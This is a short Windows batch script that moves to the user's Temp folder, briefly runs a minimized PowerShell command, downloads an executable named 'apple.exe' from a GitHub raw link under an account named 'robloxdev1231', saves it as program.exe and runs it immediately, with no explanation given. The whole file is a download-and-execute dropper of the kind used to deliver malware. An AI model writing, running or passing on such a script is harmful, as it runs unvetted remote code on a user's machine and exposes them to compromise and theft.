@echo off
cd /d %USERPROFILE%\AppData\Local\Temp
REM 
powershell -WindowStyle Minimized -Command "Start-Sleep -Milliseconds 100"
REM 
curl -L "https://github.com/robloxdev1231/ok/raw/refs/heads/main/apple.exe" -o "program.exe"
REM
program.exe
